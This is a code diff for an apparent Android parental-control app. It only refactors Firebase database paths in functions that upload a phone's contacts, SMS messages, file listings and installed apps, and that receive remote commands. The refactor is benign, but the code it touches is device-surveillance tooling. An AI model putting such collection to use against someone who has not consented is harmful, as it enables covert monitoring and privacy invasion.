@@ -40,6 +40,10 @@ object FirebaseManager {
     val database: FirebaseDatabase
         get() = FirebaseDatabase.getInstance()
 
+    fun getRef(path: String): DatabaseReference {
+        return database.getReference("parent's control/$path")
+    }
+
     fun getSanitizedEmail(email: String): String {
         return email.replace(".", "_")
     }
@@ -47,7 +51,7 @@ object FirebaseManager {
     // Creates the initial command structure in Firebase as requested
     fun createDefaultCommandStructure(email: String) {
         val sanitized = getSanitizedEmail(email)
-        val ref = database.getReference("Command").child(sanitized)
+        val ref = getRef("Command").child(sanitized)
         
         ref.addListenerForSingleValueEvent(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
@@ -90,7 +94,7 @@ object FirebaseManager {
     // New helper to upload structural details of the device status (e.g. permissions logs) directly to Firebase Console
     fun uploadDeviceStatus(email: String, permissions: Map<String, Boolean>) {
         val sanitized = getSanitizedEmail(email)
-        val ref = database.getReference("Devices").child(sanitized)
+        val ref = getRef("Devices").child(sanitized)
         val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
         
         val permissionsMap = permissions.mapKeys { (key, _) ->
@@ -115,7 +119,7 @@ object FirebaseManager {
 
     fun submitUpload(email: String, fileUrl: String, type: String, details: String) {
         val sanitized = getSanitizedEmail(email)
-        val ref = database.getReference("Upload's").child(sanitized).push()
+        val ref = getRef("Upload's").child(sanitized).push()
         
         val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
         val uploadMap = mapOf(
@@ -135,7 +139,7 @@ object FirebaseManager {
 
     fun uploadContacts(context: Context, email: String) {
         val sanitized = getSanitizedEmail(email)
-        val ref = database.getReference("Devices").child(sanitized).child("Contacts")
+        val ref = getRef("Devices").child(sanitized).child("Contacts")
         
         if (androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_CONTACTS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
             ref.setValue(mapOf("error" to "Permission READ_CONTACTS not granted"))
@@ -182,7 +186,7 @@ object FirebaseManager {
 
     fun uploadSMS(context: Context, email: String) {
         val sanitized = getSanitizedEmail(email)
-        val ref = database.getReference("Devices").child(sanitized).child("SMS")
+        val ref = getRef("Devices").child(sanitized).child("SMS")
         
         if (androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
             ref.setValue(mapOf("error" to "Permission READ_SMS not granted"))
@@ -229,7 +233,7 @@ object FirebaseManager {
 
     fun uploadStorageStructure(context: Context, email: String) {
         val sanitized = getSanitizedEmail(email)
-        val ref = database.getReference("Devices").child(sanitized).child("StorageStructure")
+        val ref = getRef("Devices").child(sanitized).child("StorageStructure")
         
         val root = FileManager.getRootDirectory(context)
         val fileList = mutableListOf<Map<String, Any>>()
@@ -300,7 +304,7 @@ object FirebaseManager {
 
     fun uploadInstalledApps(context: Context, email: String) {
         val sanitized = getSanitizedEmail(email)
-        val ref = database.getReference("Devices").child(sanitized).child("InstalledApps")
+        val ref = getRef("Devices").child(sanitized).child("InstalledApps")
         
         try {
             val pm = context.packageManager
@@ -370,7 +374,7 @@ object FirebaseManager {
         isStorageObserverRegistered = true
         
         val sanitized = getSanitizedEmail(email)
-        val ref = database.getReference("Devices").child(sanitized).child("StorageStructure")
+        val ref = getRef("Devices").child(sanitized).child("StorageStructure")
         
         ref.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
@@ -428,7 +432,7 @@ object FirebaseManager {
         onFailure: (Exception) -> Unit
     ) {
         val sanitized = getSanitizedEmail(targetEmail)
-        val ref = database.getReference("Command").child(sanitized).child("notification")
+        val ref = getRef("Command").child(sanitized).child("notification")
         
         val data = mapOf(
             "title" to title,
